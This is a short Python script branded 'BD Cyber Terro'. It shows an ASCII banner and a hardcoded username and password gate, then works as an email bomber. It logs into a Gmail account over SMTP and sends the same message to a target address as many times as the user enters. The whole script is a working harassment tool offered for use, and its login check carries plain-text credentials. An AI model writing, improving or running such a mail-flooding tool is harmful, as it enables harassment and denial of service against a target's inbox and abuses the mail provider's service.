green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White
blue="\033[0;34m"         # Blue
red="\033[0;31m"          # Red

print(green+"""
______     _   _____       _                 _____                    
| ___ \   | | /  __ \     | |               |_   _|                   
| |_/ / __| | | /  \/_   _| |__   ___ _ __    | | ___ _ __ _ __ ___   
| ___ \/ _` | | |   | | | | '_ \ / _ \ '__|   | |/ _ \ '__| '__/ _ \  
| |_/ / (_| | | \__/\ |_| | |_) |  __/ |      | |  __/ |  | | | (_) | 
\____/ \__,_|  \____/\__, |_.__/ \___|_|      \_/\___|_|  |_|  \___/  
                      __/ |                                           
                     |___/                                            
""")












number=0
while number <=10:
	
	username="cyber5885"
	password="terro5885"
	
	intusername=str(input(blue+"[>] Enter The user name: "))
	intpassword=str(input(on_ipurple+"\n[>] Enter The password: "))
	if username==intusername and password==intpassword:
		print(red+"\nLogin susseccful? \n\n					[𝔻𝕖𝕧𝕖𝕝𝕠𝕡𝕖𝕕]\n")
		break
	else:
		print(red+"\nYou Are Worng Username Or Wrong Password  ")
		
print(green+"				[𝔽𝕒𝕣𝕒𝕓𝕚 ℂ𝕙𝕠𝕨𝕕𝕙𝕦𝕣𝕪]\n\n")
	
		
		
#		sys.exit()

print("╔═══════ 	- 	════════╗   \n")

print("𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆  𝔹𝔻🎭ℂ𝕐𝔹𝔼ℝ🎭𝕋𝔼ℝℝ𝕆   ")


print("\n╚═══════ 	-      ════════╝")

import smtplib

terro=smtplib.SMTP('smtp.gmail.com','587')
terro.ehlo()
terro.starttls()

email=str(input(blue+"\n[>] Enter Your Gmail: "))
pwd=str(input(on_ipurple+"\n[>] Enter Your Password: "))
tmail=str(input(red+"\n[>] Enter Your Target E-Mail: "))
msg=str(input(yellow+"\n[>] Enter Your message: "))
amount=int(input(blue+"\n[>] Enter The amount: "))

terro.login(email,pwd)

for i in range(amount):
	terro.sendmail(email,tmail,msg)
	print(green+str(i+1)+" mail sent")